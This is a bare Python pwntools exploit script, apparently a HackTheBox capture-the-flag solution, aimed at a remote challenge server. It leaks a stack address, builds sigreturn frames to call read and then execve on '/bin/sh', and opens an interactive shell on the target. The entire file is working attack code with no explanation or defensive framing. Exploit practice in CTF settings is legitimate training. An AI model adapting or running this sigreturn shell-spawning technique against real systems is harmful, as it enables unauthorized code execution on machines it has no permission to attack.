#!/usr/bin/env python
from pwn import *
#from os import popen

context.arch = 'amd64'
e = ELF('./pwn')
#p = process('./pwn')
p = remote('docker.hackthebox.eu',30760)
#p = remote('172.17.0.2',5555)
#gdb.attach(p)
#raw_input()

#p.sendline('A'*8+p64(0x401016)+p64(0x401039)+str(frame))
p.send('A'*8+p64(0x40102f)+p64(0x401005))
#p.sendline('A'*14)
for i in xrange(3):
    p.recv(8)
stack_leak = u64(p.recv(8)) - 0x400-0xd-8
p.recv()
log.success('leaked stack: '+hex(stack_leak))

frame = SigreturnFrame(kernel="amd64")
frame.rax=0
frame.rdi=0
frame.rsi=stack_leak
frame.rdx=2000
frame.rsp=stack_leak
frame.rip=0x401039

p.send(('A'*8+p64(0x401016)+p64(0x401039)+str(frame))[:0x12c])
raw_input()
p.sendline('a'*14)
frame = SigreturnFrame(kernel="amd64")

frame.rax=59
frame.rdi=stack_leak
frame.rsi=0
frame.rdx=0
frame.rsp=stack_leak
frame.rip=0x401039

payload = p64(0x401016)+p64(0x401039)
frame.rdi=len(payload+str(frame))+stack_leak+8
frame.rsi=len(payload+str(frame))+stack_leak+16
payload += str(frame)+"/bin/sh\x00"+p64(frame.rdi)
print payload
raw_input()
#__import__('time').sleep(3)
p.send(p64(0x401016))
raw_input()
#__import__('time').sleep(3)
p.send("A"*8+payload)
#raw_input()
__import__('time').sleep(2)
p.sendline('A'*14)
#print len(payload)
#p.sendline('A'*8+payload)
p.interactive()
